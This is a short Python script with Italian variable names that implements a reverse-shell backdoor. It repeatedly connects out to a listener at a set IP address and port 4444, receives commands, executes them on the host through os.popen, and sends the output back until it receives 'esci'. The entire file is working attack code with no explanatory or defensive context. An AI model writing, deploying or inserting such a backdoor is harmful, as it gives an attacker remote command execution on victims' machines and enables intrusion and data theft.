import socket
import os

ip = "127.0.0.1"  
porta = 4444          

while True:
    try:
        connessione_backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connessione_backdoor.connect((ip, porta))
        
        while True:
            comando = connessione_backdoor.recv(1024).decode('utf-8')
            
            if comando.lower() == "esci":
                connessione_backdoor.close()
                break
            else:
                output = os.popen(comando).read() 
                connessione_backdoor.sendall(output.encode('utf-8'))
                
    except Exception as e:
        print(f"Errore: {e}")
        continue
